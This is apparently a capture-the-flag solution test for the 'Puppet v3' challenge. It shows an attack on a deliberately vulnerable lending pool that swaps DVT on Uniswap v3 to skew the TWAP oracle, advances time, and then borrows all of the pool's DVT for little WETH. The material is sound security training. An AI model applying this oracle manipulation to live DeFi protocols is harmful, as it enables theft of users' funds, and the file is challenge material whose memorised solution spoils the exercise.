...
describe("[Challenge] Puppet v3", function () {
  ...
  /**
   * The goal of this challenge is to borrow all the DVT from the lending pool.
   * The player can do so by:
   * 1. Swapping all their DVT for WETH on Uniswap v3
   * 2. Depositing the WETH in the lending pool to borrow all the DVT
   * 3. Ensure that the time-weighted average price of the pool is influenced to be in the player's favor
   * 4. Borrow all the DVT from the lending pool
   * Uniswap V3 relies on time-weighted average price (TWAP) oracles to determine the price of the pool.
   * The player can influence the TWAP by swapping a large amount of DVT for WETH at a favorable price.
   * The player just needs to ensure some time has passed before borrowing from the lending pool, otherwise
   * the oracle will return the same price as the current price, which is not what we want.
   * Luckily for us, we have more than enough DVT tokens to saturate the pool enough to devalue DVT against WETH.
   * For convenience, I have used the mainnet swap router address in the code below for swapping tokens.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const swapRouter = new ethers.Contract(
      "0xE592427A0AEce92De3Edee1F18E0157C05861564", // mainnet router address
      swapRouterJson.abi,
      player
    );
    const wethPlayer = weth.connect(player);
    const lendingPoolPlayer = lendingPool.connect(player);

    await token
      .connect(player)
      .approve(swapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    ...
    await swapRouter.exactInputSingle({
      ...
      // These values below matter in production, but not in this test
      amountOutMinimum: 1,
      sqrtPriceLimitX96: 0,
    });

    // Increase time. Any time before 115 seconds mark should work to pass the challenge.
    // We do this to leave some time to influence the time-weighted average price of the pool that the oracle spits out.
    // Otherwise, the oracle will return the same price as the current price, which is not what we want.
    await time.increase(106);

    const amountNeededToDeposit =
      await lendingPool.calculateDepositOfWETHRequired(
        LENDING_POOL_INITIAL_TOKEN_BALANCE
      );

    // We check that the amount needed to deposit is less than the player's initial balance
    expect(amountNeededToDeposit).to.be.lt(PLAYER_INITIAL_ETH_BALANCE);

    // We deposit the amount needed to borrow all the DVT in the lending pool
    await wethPlayer.deposit({ value: amountNeededToDeposit });
    await wethPlayer.approve(lendingPool.address, amountNeededToDeposit);
    await lendingPoolPlayer.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  });
